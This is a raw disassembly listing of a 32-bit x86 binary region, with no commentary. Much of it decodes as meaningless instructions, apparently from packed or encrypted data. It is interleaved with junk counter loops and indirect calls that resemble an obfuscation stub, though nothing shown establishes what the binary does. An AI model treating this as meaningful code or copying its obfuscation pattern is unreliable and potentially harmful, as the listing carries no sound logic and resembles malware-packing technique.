  40488b:	or     ecx,DWORD PTR [ebx+0x304b3024]
  404891:	pop    ecx
  404892:	call   0x4b29:0xee71b9e2
  404899:	mov    dh,0xa8
  40489b:	test   DWORD PTR [ebx+eiz*8-0x4d],esi
  40489f:	xchg   edx,eax
  4048a0:	xchg   ecx,eax
  4048a1:	(bad)  
  4048a2:	ss retf 
  4048a4:	add    ebx,DWORD PTR [ebx]
  4048a6:	pop    ebx
  4048a7:	mov    edx,esi
  4048a9:	push   edx
  4048aa:	inc    edx
  4048ab:	mov    esi,DWORD PTR [edx+eax*4]
  4048ae:	inc    ecx
  4048af:	and    BYTE PTR [eax+0x27f8428e],dh
  4048b5:	mov    eax,ds:0x1e205238
  4048ba:	and    eax,0x9b17ed0
  4048bf:	out    0x10,al
  4048c1:	aaa    
  4048c2:	xchg   ch,dl
  4048c4:	retf   0x5dd3
  4048c7:	mov    ah,0xf8
  4048c9:	inc    esp
  4048ca:	dec    esp
  4048cb:	ins    DWORD PTR es:[edi],dx
  4048cc:	cld    
  4048cd:	in     al,dx
  4048ce:	sbb    al,0x15
  4048d0:	ror    DWORD PTR [edx-0x54],cl
  4048d3:	les    eax,FWORD PTR [edx]
  4048d5:	xor    BYTE PTR [ecx+ebx*4+0x42296937],dl
  4048dc:	in     al,0xf4
  4048de:	mov    bl,0xe6
  4048e0:	push   edi
  4048e1:	scas   al,BYTE PTR es:[edi]
  4048e2:	in     eax,dx
  4048e3:	and    BYTE PTR [edx],bh
  4048e5:	inc    ebp
  4048e6:	cwde   
  4048e7:	out    dx,al
  4048e8:	ror    BYTE PTR [ebx+0x5e],0x97
  4048ec:	pop    eax
  4048ed:	daa    
  4048ee:	adc    BYTE PTR [eax],ah
  4048f0:	and    BYTE PTR [ecx+0x25074f54],ah
  4048f6:	jnp    0x40495b
  4048f8:	iret   
  4048f9:	jge    0x40489a
  4048fb:	xchg   ecx,eax
  4048fc:	adc    ebp,DWORD PTR [ecx+0x1c0b5ce8]
  404902:	inc    edi
  404903:	add    ebp,esi
  404905:	cmc    
  404906:	and    al,0xe9
  404908:	sar    BYTE PTR [ebx-0x1f],cl
  40490b:	or     al,0xf7
  40490d:	test   al,0x8f
  40490f:	fwait
  404910:	add    DWORD PTR [eax+eax*4+0xd],edi
  404914:	and    esi,esi
  404916:	sub    BYTE PTR [ecx+0x8],ah
  404919:	xor    al,0x53
  40491b:	out    dx,al
  40491c:	mov    BYTE PTR [ecx+0x5a],bl
  40491f:	jmp    0x404963
  404921:	mov    dl,0x96
  404923:	mov    bh,0x9a
  404925:	push   ebx
  404926:	rcl    BYTE PTR [ecx+0x7e9d5fd3],1
  40492c:	out    dx,al
  40492d:	fwait
  40492e:	mov    edx,0xcc758bf5
  404933:	imul   ebp,DWORD PTR [ebx+eax*8],0xcd2189d3
  40493a:	stc    
  40493b:	test   DWORD PTR [ecx-0x7f],esi
  40493e:	mov    WORD PTR [esp+ecx*1-0x44a4f13a],?
  404945:	fldenv ds:0xf8c889e6
  40494b:	aad    0x4c
  40494d:	push   ebx
  40494e:	inc    ebp
  40494f:	test   al,0xcb
  404952:	pop    DWORD PTR [edi]
  404954:	imul   ebp,ecx,0xffffffc1
  404957:	mov    esi,0x25d3f94f
  40495c:	mov    ds:0xffe44d36,al
  404961:	add    WORD PTR [ebp-0x2c],0xe500
  404967:	add    DWORD PTR [ecx+0x0],edx
  40496a:	adc    eax,0x5274beed
  40496f:	mov    edx,0xecf512d2
  404974:	push   ecx
  404975:	inc    edx
  404976:	mov    bl,0xd0
  404978:	popf   
  404979:	cli    
  40497a:	sahf   
  40497b:	pushf  
  40497c:	enter  0xcb99,0xf9
  404980:	add    al,0x2
  404982:	in     al,0xaa
  404984:	sbb    edx,DWORD PTR [eax]
  404986:	popa   
  404987:	daa    
  404988:	jbe    0x4049d4
  40498a:	adc    dh,BYTE PTR [esi]
  40498c:	scas   eax,DWORD PTR es:[edi]
  40498d:	mov    ecx,0xa164568e
  404992:	mov    al,ds:0xe5bf0254
  404997:	or     DWORD PTR [ebx+eiz*4+0x1580b171],ecx
  40499e:	loopne 0x404961
  4049a0:	sub    eax,ebp
  4049a2:	sub    esi,DWORD PTR [edi]
  4049a4:	xor    ebx,edi
  4049a6:	dec    ecx
  4049a7:	scas   al,BYTE PTR es:[edi]
  4049a8:	mov    al,BYTE PTR [ecx-0x4acd5368]
  4049ae:	inc    edi
  4049af:	sahf   
  4049b0:	add    BYTE PTR [edx+edi*8],0x41
  4049b4:	pop    edx
  4049b5:	call   0x64cf:0x5a495346
  4049bc:	fmul   DWORD PTR [ebx-0x5baf434c]
  4049c2:	rol    BYTE PTR [esi+0x26],0x62
  4049c6:	in     eax,dx
  4049c7:	pop    ds
  4049c8:	fwait
  4049c9:	je     0x404a37
  4049cb:	sahf   
  4049cc:	gs pop ss
  4049ce:	xchg   edx,eax
  4049cf:	add    al,0xc5
  4049d1:	push   0x3ad8867
  4049d6:	imul   edx,DWORD PTR [edi-0x3a],0x9230b3be
  4049dd:	scas   al,BYTE PTR es:[edi]
  4049de:	pop    ds
  4049df:	fsubr  st(4),st
  4049e1:	mov    ch,BYTE PTR [ebx+0x56]
  4049e4:	sbb    eax,edx
  4049e6:	push   ss
  4049e7:	jmp    0x62008f6c
  4049ec:	or     al,BYTE PTR [esi]
  4049ee:	inc    edx
  4049ef:	cmp    ecx,DWORD PTR [esi-0x19]
  4049f2:	jmp    0x9b98e2ab
  4049f7:	dec    eax
  4049f8:	mov    esi,0xe9cc1b0f
  4049fd:	sub    DWORD PTR [esi+eax*4],ecx
  404a00:	push   0x5c09ced3
  404a05:	(bad)  
  404a06:	push   ebx
  404a07:	gs mov edi,0xc307ec18
  404a0d:	sub    DWORD PTR [edx-0x3ecbc4ed],eax
  404a13:	out    0x88,al
  404a15:	int3   
  404a16:	jmp    0x254b:0xd5b23a2d
  404a1d:	mov    eax,ds:0x378e04d7
  404a22:	xchg   esi,eax
  404a23:	mov    esp,0xaff6e953
  404a28:	jl     0x404a8b
  404a2a:	in     eax,0x55
  404a2c:	inc    eax
  404a2d:	jmp    0x4049cb
  404a2f:	pop    ebx
  404a30:	adc    BYTE PTR [edi],0x19
  404a33:	dec    edi
  404a34:	int3   
  404a35:	out    0x31,al
  404a37:	sti    
  404a38:	jne    0x404aac
  404a3a:	jmp    0x404a0e
  404a3c:	cmc    
  404a3d:	in     al,0x42
  404a3f:	in     eax,0x1a
  404a41:	jmp    DWORD PTR [eax+edi*1]
  404a44:	daa    
  404a45:	lods   eax,DWORD PTR ds:[esi]
  404a46:	sbb    BYTE PTR [edx+0x6ae6fe2e],ch
  404a4c:	mov    DWORD PTR [ecx],0x2e37238d
  404a52:	rol    BYTE PTR [ecx-0x19],1
  404a55:	and    ebx,ebp
  404a57:	repnz daa 
  404a59:	add    BYTE PTR [edx],al
  404a5b:	pop    ds
  404a5c:	jb     0x404ab8
  404a5e:	imul   dh
  404a60:	mov    cl,0x73
  404a62:	je     0x404a0d
  404a64:	imul   esp,DWORD PTR [ebx+0x1f49a3d6],0x1c9c7a80
  404a6e:	jmp    0x404acf
  404a70:	pop    esi
  404a71:	pop    ebx
  404a72:	leave  
  404a73:	ret    
  404a74:	push   ebp
  404a75:	mov    ebp,esp
  404a77:	sub    esp,0x2c
  404a7a:	leave  
  404a7b:	ret    0x10
  404a7e:	push   ebp
  404a7f:	mov    ebp,esp
  404a81:	sub    esp,0x44
  404a84:	adc    DWORD PTR ds:0x43383f,edi
  404a8a:	push   edi
  404a8b:	mov    eax,DWORD PTR [ebp+0xc]
  404a8e:	mov    edx,DWORD PTR ds:0x4337b7
  404a94:	and    DWORD PTR ds:0x433803,edx
  404a9a:	mov    DWORD PTR [ebp-0x10],eax
  404a9d:	adc    DWORD PTR ds:0x43372b,0x2679
  404aa7:	mov    eax,DWORD PTR [ebp+0x8]
  404aaa:	xor    ecx,DWORD PTR ds:0x43376b
  404ab0:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  404ab7:	mov    DWORD PTR ds:0x43382b,0x7030
  404ac1:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  404ac8:	and    DWORD PTR ds:0x4337c3,0x0
  404ad2:	mov    edi,DWORD PTR ds:0x4337c3
  404ad8:	inc    edi
  404ad9:	mov    DWORD PTR ds:0x4337c3,edi
  404adf:	cmp    DWORD PTR ds:0x4337c3,0x6
  404ae6:	jne    0x404af5
  404aec:	push   DWORD PTR [ebp-0x18]
  404aef:	call   DWORD PTR ds:0x412358
  404af5:	cmp    DWORD PTR ds:0x4337c3,0x5
  404afc:	jne    0x404b0f
  404b02:	mov    edi,DWORD PTR ds:0x4337c3
  404b08:	inc    edi
  404b09:	mov    DWORD PTR ds:0x4337c3,edi
  404b0f:	cmp    DWORD PTR ds:0x4337c3,0x14
  404b16:	jb     0x404ad2
  404b1c:	jmp    0x404e76
  404b21:	push   ecx
  404b22:	mov    esi,0xf1913591
  404b27:	jno    0x404b83
  404b29:	ins    DWORD PTR es:[edi],dx
  404b2a:	inc    ebp
  404b2b:	fild   WORD PTR [ecx-0x55ce5691]
  404b31:	xor    ebp,DWORD PTR ds:0x7d337e7e
  404b37:	jle    0x404bb7
  404b39:	inc    ecx
  404b3a:	lods   al,BYTE PTR ds:[esi]
  404b3b:	jmp    0xa7f1:0x9a2ad9d2
  404b42:	adc    eax,0x9a05d7f5
  404b47:	sbb    BYTE PTR [ecx+0xd],bl
  404b4a:	dec    ecx
  404b4b:	and    ah,ch
  404b4d:	ror    DWORD PTR gs:[edx],cl
  404b50:	arpl   WORD PTR [ecx+eax*1],ax
  404b53:	mov    dh,0x67
  404b55:	xor    DWORD PTR [edi-0x7ddd3b6c],0xeb99f902
  404b5f:	faddp  st(5),st
  404b61:	jge    0x404ba8
  404b63:	xchg   edx,eax
  404b64:	or     DWORD PTR ds:0x8b29bcf3,eax
  404b6a:	mov    bh,BYTE PTR [esi+0x43]
  404b6d:	out    dx,al
  404b6e:	jmp    0xd666:0xfb7a6702
  404b75:	pop    ebp
  404b76:	mov    DWORD PTR ds:0xe5e63306,edx
  404b7c:	adc    al,0xad
  404b7e:	xchg   edx,eax
  404b7f:	pop    esp
  404b80:	pop    ebx
  404b81:	lock test al,0x19
  404b84:	jmp    0x404bde
  404b86:	push   edx
  404b87:	mov    ecx,0x2b2d01ff
  404b8c:	push   esp
  404b8d:	(bad)  
  404b8e:	in     al,dx
  404b8f:	mov    ch,0x1b
  404b91:	rcr    al,cl
  404b93:	pop    esi
  404b94:	ror    BYTE PTR [edx],0x19
  404b97:	sub    DWORD PTR [ebx-0x409969f6],0xb1bc22d0
  404ba1:	popa   
  404ba2:	pop    eax
  404ba3:	shr    BYTE PTR [edi+edx*1+0x4a],cl
  404ba7:	pop    ecx
  404ba8:	rol    edi,0x24
  404bab:	daa    
  404bac:	sbb    al,0x14
  404bae:	(bad)  
  404baf:	out    dx,eax
  404bb0:	dec    ebx
  404bb1:	jb     0x404bbb
  404bb3:	fisubr DWORD PTR ds:0xcd28abc7
  404bb9:	mov    al,0xc0
  404bbb:	sub    BYTE PTR [eax],cl
  404bbd:	fidivr DWORD PTR es:[esi+0x70d76f14]
  404bc4:	ret    0x948c
  404bc7:	fld    QWORD PTR [ecx+0x2312eed6]
  404bcd:	xchg   ecx,eax
  404bce:	xchg   ebx,eax
  404bcf:	inc    ebp
  404bd0:	lods   al,BYTE PTR ds:[esi]
  404bd1:	or     ebp,DWORD PTR [eax]
  404bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bd4:	adc    eax,DWORD PTR [esp+edx*4-0x29]
  404bd8:	fldenv [eax-0x2a]
  404bdb:	setp   BYTE PTR [ebx-0x46]
  404bdf:	cmp    DWORD PTR [eax+ebx*2+0x98e65a5],edx
  404be6:	ret    0x3bc
  404be9:	gs aas 
  404beb:	test   eax,0x2a0eb629
  404bf0:	or     dh,cl
  404bf2:	push   eax
  404bf3:	aas    
  404bf4:	mov    edx,0x4534c914
  404bf9:	fdivr  DWORD PTR [ecx]
  404bfb:	sahf   
  404bfc:	jnp    0x404b97
  404bfe:	dec    ebx
  404c00:	mov    ds:0x43e44a5b,al
  404c05:	xor    ebp,eax
  404c07:	aam    0x4
  404c09:	inc    ebp
  404c0a:	bound  edi,QWORD PTR [edi+0x2b]
  404c0d:	xlat   BYTE PTR ds:[ebx]
  404c0e:	dec    DWORD PTR [edi-0x10d3319d]
  404c14:	dec    ebp
  404c15:	int    0xfc
  404c17:	and    al,0x2d
  404c19:	test   BYTE PTR [ecx-0x5e],dl
  404c1c:	dec    esp
  404c1d:	push   0xffffffa2
  404c1f:	push   0x34
  404c21:	das    
  404c22:	mov    ebp,0xfe16b20
  404c27:	arpl   WORD PTR [ebp-0x6a],cx
  404c2a:	xchg   esi,eax
  404c2b:	add    eax,0x3a21ffb1
  404c30:	xor    DWORD PTR [edi],0xb6c8fc8
  404c36:	cmp    BYTE PTR [esi-0x572f04c7],dl
  404c3c:	lds    ebx,FWORD PTR [edi]
  404c3e:	adc    dl,BYTE PTR [edx-0x59]
  404c41:	cld    
  404c42:	sub    ebp,ebx
  404c44:	addr16 aas 
  404c46:	test   eax,eax
  404c48:	jmp    0x596f:0x261af154
  404c4f:	push   es
  404c50:	add    esi,0x2c5a1563
  404c56:	call   0xd816:0x16c9890e
  404c5d:	sub    bl,al
  404c5f:	in     al,dx
  404c60:	(bad)  
  404c61:	ins    DWORD PTR es:[edi],dx
  404c62:	push   ebx
  404c63:	adc    edx,esp
  404c65:	jle    0x404cb7
  404c67:	fidiv  WORD PTR ds:0x90d4f2fb
  404c6d:	jle    0x404c8f
  404c6f:	data16 jns 0x404c1d
  404c72:	aaa    
  404c73:	std    
  404c74:	jl     0x404c1b
  404c76:	mov    bh,0xbb
  404c78:	or     ecx,DWORD PTR [esi]
  404c7a:	mov    WORD PTR [ebx],es
  404c7c:	jge    0x404c34
  404c7e:	cdq    
  404c7f:	nop
  404c80:	iret   
  404c81:	adc    al,0xe6
  404c83:	xchg   esi,eax
  404c84:	rcr    BYTE PTR [edi+edi*1+0x582849a5],1
  404c8b:	push   0xffffffab
  404c8d:	inc    esp
  404c8e:	pop    ss
  404c8f:	mov    esi,0x29eaafb8
  404c94:	popa   
  404c95:	cmp    DWORD PTR [ecx],0x49
  404c98:	mov    esi,DWORD PTR [ebx]
  404c9a:	mov    al,0x61
  404c9c:	inc    edx
  404c9d:	push   0xffffffa7
  404c9f:	call   0xfb683249
  404ca4:	int    0xd4
  404ca6:	adc    DWORD PTR [ecx-0x6b],esi
  404ca9:	adc    eax,0x73e054c2
  404cae:	int    0xd7
  404cb0:	push   ecx
  404cb1:	add    cl,bl
  404cb3:	sbb    ecx,DWORD PTR [ebx+0x67]
  404cb6:	retf   
  404cb7:	dec    ecx
  404cb8:	cs xchg esp,eax
  404cba:	(bad)  
  404cbb:	aad    0x5f
  404cbd:	inc    ebx
  404cbe:	cmc    
  404cbf:	jns    0x404ccc
  404cc1:	mov    ebp,0xc4a162be
  404cc6:	std    
  404cc7:	(bad)  [esi-0x5244bb26]
  404ccd:	fcomp  QWORD PTR [ebp-0x463b2721]
  404cd3:	cmp    ch,BYTE PTR [ecx+0x1a9d20b]
  404cd9:	and    BYTE PTR [eax+0x3df47884],dl
  404cdf:	sub    al,0x7c
  404ce1:	repnz sbb DWORD PTR [esi+0x143e3095],ecx
  404ce8:	popf   
  404ce9:	and    BYTE PTR [ecx],bl
  404ceb:	call   0x234c:0x19334fd0
  404cf2:	sub    BYTE PTR [edx],bl
  404cf4:	push   edi
  404cf5:	inc    eax
  404cf6:	push   ss
  404cf7:	daa    
  404cf8:	cmp    eax,0x79df1a27
  404cfd:	lahf   
  404cfe:	lahf   
  404cff:	sub    edx,ebx
  404d01:	dec    edx
  404d02:	test   eax,0xafa86832
  404d07:	addr16 cmp al,0x27
  404d0a:	dec    esi
  404d0b:	xchg   edi,eax
  404d0c:	addr16 icebp 
  404d0e:	inc    ecx
  404d0f:	bound  eax,QWORD PTR [esi-0x12]
  404d12:	std    
  404d13:	out    dx,al
  404d14:	xchg   ebp,eax
  404d15:	mov    cl,0xb6
  404d17:	or     ebp,esi
  404d19:	mov    ch,0xda
  404d1b:	pop    esp
  404d1c:	pand   mm1,QWORD PTR [esi-0x17]
  404d20:	inc    ebp
  404d21:	cmp    BYTE PTR [esi+0x46],cl
  404d24:	xor    eax,edx
  404d26:	or     eax,0x5ed76fb1
  404d2b:	mul    BYTE PTR [ebx+0x65]
  404d2e:	mov    bh,0x32
  404d30:	fwait
  404d31:	add    eax,0x14e0da25
  404d36:	xchg   edi,eax
  404d37:	div    DWORD PTR [ecx+0x13]
  404d3a:	dec    edx
  404d3b:	lods   eax,DWORD PTR ds:[esi]
  404d3c:	jo     0x404d10
  404d3e:	shr    BYTE PTR [ecx],1
  404d40:	inc    edi
  404d41:	jb     0x404d12
  404d43:	ret    0xf0bd
  404d46:	cmp    DWORD PTR [eax],edi
  404d48:	and    esp,DWORD PTR [ebx]
  404d4a:	xchg   ecx,eax
  404d4b:	add    eax,0x4f66f314
  404d50:	stos   DWORD PTR es:[edi],eax
  404d51:	fisttp WORD PTR [esi-0x66]
  404d54:	(bad)  
  404d55:	dec    DWORD PTR ds:0x39791c1d
  404d5b:	in     al,0xda
  404d5d:	imul   ebx,DWORD PTR ds:0x9263bb6b,0xfe5cba2b
  404d67:	mov    esp,0x193884e9
  404d6c:	mov    BYTE PTR [esi],0x43
  404d6f:	push   es
  404d70:	adc    eax,0x9db26688
  404d75:	(bad)  
  404d76:	jo     0x404d7d
  404d78:	icebp  
  404d79:	push   esp
  404d7a:	mov    ?,ecx
  404d7c:	xor    eax,0xcac72397
  404d81:	stos   BYTE PTR es:[edi],al
  404d82:	fsubr  QWORD PTR [esi]
  404d84:	push   edx
  404d85:	jo     0x404d36
  404d87:	in     al,dx
  404d88:	std    
  404d89:	mov    ecx,DWORD PTR [eax]
  404d8b:	mov    dl,0x73
  404d8d:	xchg   edx,eax
  404d8e:	push   esi
  404d8f:	enter  0xa255,0xd0
  404d93:	adc    al,0xdb
  404d95:	lea    esp,[edi]
  404d97:	sub    esi,ebx
  404d99:	or     BYTE PTR [ecx-0x73],dl
  404d9c:	and    DWORD PTR [edx-0x34d1fac7],esi
  404da2:	(bad)  
  404da3:	cmp    al,0x24
  404da5:	popa   
  404da6:	mov    ah,0xee
  404da8:	addr16 repz dec ebp
  404dab:	lods   al,BYTE PTR ds:[esi]
  404dac:	adc    BYTE PTR [edi+0x645c82d1],dl
  404db2:	fcmovnbe st,st(7)
  404db4:	retf   0x1fbd
  404db7:	gs mov dl,0xb1
  404dba:	dec    esp
  404dbb:	fld    DWORD PTR [edi-0x7d]
  404dbe:	inc    esi
  404dbf:	or     BYTE PTR [esi-0x6c],0x5d
  404dc3:	sub    al,BYTE PTR ds:0x1cd7cf51
  404dc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dca:	mov    ds:0x7020b917,eax
  404dcf:	mov    bl,dl
  404dd1:	and    esp,DWORD PTR [ebp+0x0]
  404dd4:	stos   DWORD PTR es:[edi],eax
  404dd5:	dec    eax
  404dd6:	cdq    
  404dd7:	nop
  404dd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dd9:	xor    BYTE PTR [ebx+edx*2-0x36eb161f],dl
  404de0:	imul   ebp,ecx,0xffffffa5
  404de3:	mov    BYTE PTR [edx+0x7a],ah
  404de6:	dec    esi
  404de7:	pop    eax
  404de8:	mov    edi,0x8eb0f1f3
  404ded:	dec    ebx
  404dee:	mov    esp,0x26cc23bd
  404df3:	je     0x404d9b
  404df5:	arpl   WORD PTR [eax],di
  404df7:	inc    edx
  404df8:	fstp   DWORD PTR [ebx+ebx*8]
  404dfb:	add    BYTE PTR [edi],bl
  404dfd:	add    ah,BYTE PTR [esi]
  404dff:	pop    ecx
  404e00:	or     DWORD PTR [eax],ebp
  404e02:	dec    ebx
  404e03:	in     eax,dx
  404e04:	add    ch,ah
  404e06:	icebp  
  404e07:	add    DWORD PTR [edx-0x59],ebx
  404e0a:	nop
  404e0b:	sar    DWORD PTR [ecx-0x17ac0b44],1
  404e11:	push   cs
  404e12:	xor    DWORD PTR [ecx+0x7e22285c],eax
  404e18:	call   0xeb273e11
  404e1d:	fs pop edi
  404e1f:	(bad)  
  404e20:	push   edx
  404e21:	xlat   BYTE PTR ds:[ebx]
  404e22:	sbb    eax,0xbbbf0ffb
  404e27:	sub    BYTE PTR [ecx],ch
  404e29:	adc    ebx,DWORD PTR [eax]
  404e2b:	xlat   BYTE PTR ds:[ebx]
  404e2c:	mov    eax,0x52db36ca
  404e31:	and    ch,ch
  404e33:	adc    dl,BYTE PTR ds:0x436d83c3
  404e39:	jne    0xf64cfcfb
  404e3f:	dec    esp
  404e40:	push   ss
  404e41:	outs   dx,BYTE PTR ds:[esi]
  404e42:	mov    cl,0x70
  404e44:	jbe    0x404e31
  404e46:	xor    DWORD PTR [edi-0xa],esi
  404e49:	fnstsw WORD PTR [ebx-0x1c]
  404e4c:	mov    eax,ds:0xfdaef4b4
  404e51:	ins    BYTE PTR es:[edi],dx
  404e52:	mov    al,ds:0x747777a4
  404e57:	inc    ecx
  404e58:	push   0x70
  404e5a:	int3   
  404e5b:	add    ah,BYTE PTR [ebx]
  404e5d:	out    dx,al
  404e5e:	mov    esi,0x814dbcac
  404e63:	mov    cl,0x68
  404e65:	adc    eax,0xcc50c860
  404e6a:	out    0xf1,eax
  404e6c:	xchg   esp,eax
  404e6d:	fist   WORD PTR [edi]
  404e6f:	push   ebx
  404e70:	popf   
  404e71:	sti    
  404e72:	sbb    BYTE PTR [eax],al
  404e74:	loop   0x404e41
  404e76:	mov    edx,DWORD PTR [ebp+0x8]
  404e79:	adc    ecx,0x7359
  404e7f:	mov    DWORD PTR [ebp-0x40],eax
  404e82:	mov    eax,0x7510854
  404e87:	xor    edx,eax
  404e89:	adc    DWORD PTR ds:0x43371b,0x3221
  404e93:	mov    ecx,0x32729b
  404e98:	mov    edi,DWORD PTR ds:0x4337e7
  404e9e:	adc    DWORD PTR ds:0x43377f,edi
  404ea4:	add    edx,ecx
  404ea6:	neg    edi
  404ea8:	mov    DWORD PTR [ebp-0x8],edx
  404eab:	mov    DWORD PTR ds:0x4337eb,0x10
  404eb5:	cmp    DWORD PTR ds:0x4337eb,0x0
  404ebc:	je     0x404f14
  404ec2:	cmp    DWORD PTR ds:0x4337eb,0x9
  404ec9:	jne    0x404ee2
  404ecf:	push   0x6f04
  404ed4:	push   0x5d47
  404ed9:	push   DWORD PTR [ebp-0x1c]
  404edc:	call   DWORD PTR ds:0x41235c
  404ee2:	cmp    DWORD PTR ds:0x4337eb,0xa
  404ee9:	jne    0x404efc
  404eef:	mov    edi,DWORD PTR ds:0x4337eb
  404ef5:	dec    edi
  404ef6:	mov    DWORD PTR ds:0x4337eb,edi
  404efc:	mov    edi,DWORD PTR ds:0x4337eb
  404f02:	dec    edi
  404f03:	mov    DWORD PTR ds:0x4337eb,edi
  404f09:	jmp    0x404eb5
  404f0e:	and    DWORD PTR ds:0x43383f,ecx
  404f14:	mov    edx,DWORD PTR [ebp+0x8]
  404f17:	sbb    edi,DWORD PTR ds:0x4337eb
  404f1d:	xor    edx,eax
  404f1f:	sbb    edi,DWORD PTR ds:0x4337bf
  404f25:	add    edx,ecx
  404f27:	and    DWORD PTR ds:0x43383b,0x0
  404f31:	xor    edi,edi
  404f33:	add    edi,DWORD PTR ds:0x43383b
  404f39:	inc    edi
  404f3a:	mov    DWORD PTR ds:0x43383b,edi
  404f40:	cmp    DWORD PTR ds:0x43383b,0xc
  404f47:	jne    0x404f58
  404f4d:	push   0x3fd8
  404f52:	call   DWORD PTR ds:0x412000
  404f58:	cmp    DWORD PTR ds:0x43383b,0xb
  404f5f:	jne    0x404f72
  404f65:	mov    edi,DWORD PTR ds:0x43383b
  404f6b:	inc    edi
  404f6c:	mov    DWORD PTR ds:0x43383b,edi
  404f72:	cmp    DWORD PTR ds:0x43383b,0x17
  404f79:	jb     0x404f31
  404f7f:	mov    DWORD PTR [ebp+0xc],edx
  404f82:	mov    DWORD PTR ds:0x433737,0x5f27
  404f8c:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  404f93:	xor    DWORD PTR ds:0x433767,edi
  404f99:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  404fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  404fa7:	sbb    DWORD PTR ds:0x4337ef,edi
  404fad:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  404fb4:	adc    DWORD PTR ds:0x43370f,ecx
  404fba:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  404fc1:	movzx  edi,WORD PTR ds:0x433767
  404fc8:	and    DWORD PTR ds:0x433713,edi
  404fce:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  404fd5:	dec    edx
  404fd6:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  404fdd:	mov    edx,DWORD PTR [ebp+0x8]
  404fe0:	add    DWORD PTR ds:0x4337e7,ebx
  404fe6:	xor    edx,eax
  404fe8:	add    edi,0x469e
  404fee:	mov    edi,DWORD PTR [ebp-0x10]
  404ff1:	add    edx,ecx
  404ff3:	cmp    edi,edx
  404ff5:	mov    DWORD PTR ds:0x43382f,0x53a
  404fff:	je     0x40685f
  405005:	mov    DWORD PTR ds:0x433837,0x2c13
  40500f:	push   ebx
  405010:	mov    DWORD PTR ds:0x4337ef,0x2429
  40501a:	jmp    0x40683a
  40501f:	mov    edx,DWORD PTR [ebp-0x8]
  405022:	and    DWORD PTR ds:0x433727,0x0
  40502c:	mov    edi,DWORD PTR ds:0x433727
  405032:	inc    edi
  405033:	mov    DWORD PTR ds:0x433727,edi
  405039:	cmp    DWORD PTR ds:0x433727,0x6
  405040:	jne    0x40505d
  405046:	push   DWORD PTR [ebp-0x14]
  405049:	push   DWORD PTR [ebp-0x10]
  40504c:	push   DWORD PTR [ebp-0xc]
  40504f:	push   DWORD PTR [ebp-0x18]
  405052:	push   0x82f7
  405057:	call   DWORD PTR ds:0x41236c
  40505d:	cmp    DWORD PTR ds:0x433727,0x5
  405064:	jne    0x405079
  40506a:	xor    edi,edi
  40506c:	xor    edi,DWORD PTR ds:0x433727
  405072:	inc    edi
  405073:	mov    DWORD PTR ds:0x433727,edi
  405079:	cmp    DWORD PTR ds:0x433727,0x17
  405080:	jb     0x40502c
  405086:	xor    edi,edi
  405088:	add    edi,DWORD PTR ds:0x4337ff
  40508e:	add    DWORD PTR ds:0x4337bb,edi
  405094:	mov    edi,DWORD PTR [ebp-0x10]
  405097:	sub    edi,edx
  405099:	mov    edx,DWORD PTR [ebp-0x4]
  40509c:	xor    edx,eax
  40509e:	add    edx,ecx
  4050a0:	mov    DWORD PTR ds:0x4337eb,0x78fa
  4050aa:	cmp    edi,edx
  4050ac:	mov    DWORD PTR ds:0x43383b,0x49ec
  4050b6:	jb     0x40685e
  4050bc:	mov    edx,DWORD PTR [ebp-0x28]
  4050bf:	mov    edi,DWORD PTR [ebp-0x4]
  4050c2:	xor    edx,eax
  4050c4:	inc    DWORD PTR ds:0x43383b
  4050ca:	xor    edi,eax
  4050cc:	not    DWORD PTR ds:0x4337fb
  4050d2:	add    edi,ecx
  4050d4:	add    edx,ecx
  4050d6:	adc    ebx,0x69d8
  4050dc:	imul   edx,edi
  4050df:	mov    edi,DWORD PTR [ebp-0x8]
  4050e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4050e5:	sbb    DWORD PTR ds:0x433727,0x4337b7
  4050ef:	sub    ebx,edi
  4050f1:	mov    DWORD PTR ds:0x43371f,0x4726
  4050fb:	cmp    ebx,edx
  4050fd:	mov    DWORD PTR ds:0x4337eb,0x2e42
  405107:	ja     0x4054d4
  40510d:	and    DWORD PTR ds:0x4337ff,0x0
  405117:	jmp    0x40512b
  40511c:	xor    edx,edx
  40511e:	add    edx,DWORD PTR ds:0x4337ff
  405124:	inc    edx
  405125:	mov    DWORD PTR ds:0x4337ff,edx
  40512b:	cmp    DWORD PTR ds:0x4337ff,0x17
  405132:	jae    0x40515a
  405138:	cmp    DWORD PTR ds:0x4337ff,0x18
  40513f:	jne    0x405155
  405145:	push   0x19d0
  40514a:	push   0x338d
  40514f:	call   DWORD PTR ds:0x412004
  405155:	jmp    0x40511c
  40515a:	mov    edx,DWORD PTR [ebp-0x4]
  40515d:	sbb    DWORD PTR ds:0x4337eb,0x43376f
  405167:	xor    edx,eax
  405169:	xor    DWORD PTR ds:0x4337e7,0x55d1
  405173:	jmp    0x4054cd
  405178:	cdq    
  405179:	jp     0x4051e8
  40517b:	pushf  
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	imul   ebp,DWORD PTR [ecx+0x7b],0x879a2b7f
  405184:	stos   BYTE PTR es:[edi],al
  405185:	mov    bh,0xc2
  405187:	xor    esp,0x337e7e28
  40518d:	jge    0x40520d
  40518f:	jle    0x405153
  405191:	mov    dh,bl
  405193:	jle    0x4051a8
  405195:	and    BYTE PTR [eax-0x3664647d],bl
  40519b:	cdq    
  40519c:	push   ds
  40519d:	push   ss
  40519e:	add    BYTE PTR [ebp+0x41],al
  4051a1:	pop    ebp
  4051a2:	jno    0x405161
  4051a4:	push   0x1
  4051a6:	xor    al,0xbc
  4051a8:	sbb    al,0x2
  4051aa:	pop    ss
  4051ab:	and    DWORD PTR [esp+edi*1-0xbaa3e64],0x4366705d
  4051b6:	retf   
  4051b7:	jge    0x405216
  4051b9:	in     al,0x44
  4051bb:	pop    ds
  4051bc:	loopne 0x40516c
  4051be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051bf:	mov    bl,0xfd
  4051c1:	dec    ebp
  4051c2:	popf   
